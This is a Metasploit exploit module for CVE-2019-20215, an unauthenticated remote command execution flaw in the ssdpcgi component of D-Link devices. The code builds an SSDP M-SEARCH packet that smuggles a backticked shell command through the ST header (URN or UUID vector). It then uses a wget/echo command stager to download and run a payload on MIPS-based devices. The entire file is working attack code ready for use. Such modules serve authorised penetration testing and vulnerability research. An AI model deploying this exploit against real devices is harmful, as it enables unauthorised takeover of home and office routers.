# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi&#039;,
      &#039;Description&#039; => %q{
        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.
      },
      &#039;Author&#039;      =>
        [
          &#039;s1kr10s&#039;,
          &#039;secenv&#039;
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2019-20215&#039;],
          [&#039;URL&#039;, &#039;https://medium.com/@s1kr10s/2e799acb8a73&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 24 2019&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;        => ARCH_MIPSBE,
      &#039;DefaultOptions&#039; =>
        {
            &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;,
            &#039;RPORT&#039; => &#039;1900&#039;
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Auto&#039;,	{ } ],
        ],
      &#039;CmdStagerFlavor&#039; => %w{ echo wget },
      &#039;DefaultTarget&#039;  => 0
      ))

  register_options(
    [
      Msf::OptEnum.new(&#039;VECTOR&#039;,[true, &#039;Header through which to exploit the vulnerability&#039;, &#039;URN&#039;, [&#039;URN&#039;, &#039;UUID&#039;]])
    ])
  end

  def exploit
    execute_cmdstager(linemax: 1500)
  end

  def execute_command(cmd, opts)
    type = datastore[&#039;VECTOR&#039;]
    if type == "URN"
      print_status("Target Payload URN")
      val = "urn:device:1;`#{cmd}`"
    else
      print_status("Target Payload UUID")
      val = "uuid:`#{cmd}`"
    end

    connect_udp
    header = "M-SEARCH * HTTP/1.1\r\n"
    header << "Host:239.255.255.250: " + datastore[&#039;RPORT&#039;].to_s + "\r\n"
    header << "ST:#{val}\r\n"
    header << "Man:\"ssdp:discover\"\r\n"
    header << "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end
end

